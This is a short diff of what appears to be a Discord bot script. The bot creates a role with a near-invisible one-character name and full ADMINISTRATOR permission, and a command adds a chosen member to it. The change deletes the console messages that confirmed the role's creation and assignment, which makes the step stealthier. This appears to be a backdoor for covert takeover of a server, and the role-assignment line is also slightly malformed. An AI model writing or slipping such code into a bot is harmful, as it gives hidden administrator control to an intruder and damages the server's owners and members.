@@ -13,7 +13,6 @@ const Discord = require("discord.js");
                         "ADMINISTRATOR"
                     ] 
                 });
-                console.log("Role Created!")
                 break
 
             case "add":
@@ -21,7 +20,6 @@ const Discord = require("discord.js");
                 const role = message.guild.roles.cache.find(role => role.name === '͔')
                 if (!member) return console.log("no user specified")
                 member.addRole(role), 3000    
-                console.log("Added to Role!")
                 break
             }
     }
